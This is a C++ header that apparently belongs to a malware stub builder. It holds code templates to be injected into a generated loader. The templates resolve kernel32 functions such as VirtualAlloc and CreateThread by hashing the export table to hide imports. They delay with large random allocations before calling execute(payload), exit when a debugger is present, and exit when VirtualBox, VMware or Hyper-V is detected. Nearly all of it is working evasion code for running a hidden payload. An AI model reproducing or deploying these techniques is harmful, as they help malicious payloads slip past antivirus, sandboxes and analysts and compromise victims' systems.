#ifndef STUBSTR_H
#define STUBSTR_H

#include <string>

std::string DYN_GLOBALS = R"(
using VirtualAlloc_t = LPVOID (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
using VirtualFree_t = BOOL (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
using LoadLibraryA_t = HMODULE (WINAPI *)(LPCSTR lpLibFileName);
using CreateThread_t = HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
using WaitForSingleObject_t = DWORD (WINAPI *)(HANDLE hHandle, DWORD dwMilliseconds);
using CloseHandle_t = BOOL (WINAPI *)(HANDLE hObject);

VirtualAlloc_t VA = NULL;
VirtualFree_t VF = NULL;
LoadLibraryA_t LLA = NULL;
CreateThread_t CT = NULL;
WaitForSingleObject_t WFO = NULL;
CloseHandle_t CH = NULL;

FARPROC addr[6];

/*
VirtualAlloc_t pVirtualAlloc = NULL;
VirtualFree_t pVirtualFree = NULL;
LoadLibraryA_t pLoadLibraryA = NULL;
CreateThread_t pCreateThread = NULL;
WaitForSingleObject_t pWaitForSingleObject = NULL;
CloseHandle_t pCloseHandle = NULL;

void resolveAddress(){
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");

    if(!kernel32){
        cerr << "Failed to get handle to kernel32.dll" << endl;
        return;
    }

    pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(kernel32, "VirtualAlloc");
    pVirtualFree = (VirtualFree_t)GetProcAddress(kernel32, "VirtualFree");
    pLoadLibraryA = (LoadLibraryA_t)GetProcAddress(kernel32, "LoadLibraryA");
    pCreateThread = (CreateThread_t)GetProcAddress(kernel32, "CreateThread");
    pWaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(kernel32, "WaitForSingleObject");
    pCloseHandle = (CloseHandle_t)GetProcAddress(kernel32, "CloseHandle");

    if (!pVirtualAlloc || !pVirtualFree || !pLoadLibraryA || !pCreateThread || !pWaitForSingleObject || !pCloseHandle) {
        std::cerr << "Failed to get the address of one or more functions in init\n";
    }
}
*/

DWORD getHashFromString(char *string){
    size_t strlength = strnlen_s(string, 50);
    DWORD hash = 0x35;

    for(size_t i = 0; i < strlength; i++){
        hash += (hash * 0xab10f29fa + string[i]) & 0xffffffa;
    }

    return hash;
}

FARPROC getFunctionAddressByHash(const char *library, DWORD hash) {
    HMODULE libraryBase = LoadLibraryA(library);
    if (!libraryBase) {
        std::cerr << "Failed to load library: " << library << " with error: " << GetLastError() << std::endl;
        return NULL;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

    PDWORD addressOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

    // Debugging: Print out the export directory details
    //std::cout << "Export Directory Address: " << imageExportDirectory << std::endl;
    //std::cout << "Number of Functions: " << imageExportDirectory->NumberOfFunctions << std::endl;
    //std::cout << "Number of Names: " << imageExportDirectory->NumberOfNames << std::endl;

    for (DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++) {
        DWORD functionNameRVA = addressOfNamesRVA[i];
        char *functionName = (char *)((DWORD_PTR)libraryBase + functionNameRVA);
        DWORD functionNameHash = getHashFromString(functionName);

        // Debugging: Print each function name and its hash
        //std::cout << "Function Name: " << functionName << ", Hash: " << functionNameHash << std::endl;

        if (functionNameHash == hash) {
            DWORD functionAddressRVA = addressOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
            FARPROC functionAddress = (FARPROC)((DWORD_PTR)libraryBase + functionAddressRVA);
            std::cout << "Match found, Function Name: " << functionName << ", Address: " << functionAddress << std::endl;
            return functionAddress;
        }
    }

    std::cerr << "Failed to find function with hash: " << hash << std::endl;
    return NULL;
}

void resolver(){
    const char *lib = "kernel32.dll";
    /*DWORD_ARRAY_PLACEHOLDER*/

    for(int i=0;i<6;i++){
        addr[i] = getFunctionAddressByHash(lib, fun[i]);
    }

    // Resolve using hashing method, and compare to the result from resolveAddress()
    VA = (VirtualAlloc_t)addr[0];
    VF = (VirtualFree_t)addr[1];
    LLA = (LoadLibraryA_t)addr[2];
    CT = (CreateThread_t)addr[3];
    WFO = (WaitForSingleObject_t)addr[4];
    CH = (CloseHandle_t)addr[5];
}
)";

const std::string DYN_CALL = R"(
    resolver();
)";

const std::string RAND_DEF = R"(
int getRand(){
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(100000000, 150000000);

    return distrib(gen);
}
)";

const std::string RAND_CALL = R"(
    int a = getRand();
    int b = getRand();

    char *blocka = NULL;
    blocka = (char *) malloc(a);

    if(blocka != NULL){
        memset(blocka, 00, a);
        free(blocka);
    }

    char *blockb = NULL;
    blockb = (char *) malloc(b);

    if(blockb != NULL){
        memset(blockb, 00, b);
        free(blockb);
        execute(payload);
    }

)";

const std::string DB_DEF = R"(
void antiDb(){
    
    if(IsDebuggerPresent()){
        cout << "\nDebugger present\nexiting...";
        cin.get();
        exit(0);
    } else {
        cout << "\nNo debugger attached...\n";
    }
}

)";

// Anti-VM Source Edited From: https://github.com/basedpill/detectvm
const std::string ANTI_VM_DEF = R"(
bool DetectBySystemManufacturer()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    //System manufacturer
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemManufacturer"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Microsoft Corporation") == 0)
                return true;
        }
    }
    return false;
}
bool DetectByBiosVendor()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("BIOSVendor"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Microsoft Corporation") == 0)
                return true;
        }
    }

    return false;
}

bool DetectBySystemFamily()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemFamily"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Virtual Machine") == 0)
                return true;
        }
    }

    return false;
}

bool DetectByProductName()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemProductName"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Virtual Machine") == 0)
                return true;
        }
    }

    return false;
}

bool IsVboxVM(){
    HANDLE handle = CreateFile(_T("\\\\.\\VBoxMiniRdrDN"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (handle != INVALID_HANDLE_VALUE){CloseHandle(handle); return true;}
    return false;
}

bool IsVMwareVM(){
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = {0}; DWORD dwBufSize = sizeof(buf);
    if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\VMware, Inc.\\VMware Tools"), 0, KEY_QUERY_VALUE, &hKey ) == ERROR_SUCCESS ) {return true;}
    return false;
}

bool IsMsHyperV() {
    //Use multiple known reg entries to indicate Virtual Machines
    return DetectBySystemManufacturer() || DetectByBiosVendor() || DetectBySystemFamily()|| DetectByProductName();
}
void antiVm(){
    bool isVm = false;
    if (IsVboxVM() == true) {
        isVm = true; 
        printf("Running in vbox!");
    } else if (IsVMwareVM() == true) {
        isVm = true; 
        printf("Running in vmware!");
    } else if (IsMsHyperV() == true) {
        isVm = true; 
        printf("Running in hyper-v!");
    } else { 
        printf("Not running in a VM!");
    }
    
    if(isVm == true){
        printf("\nexiting...\n");
        exit(0);
    }
}
)";


#endif //STUBSTR_H
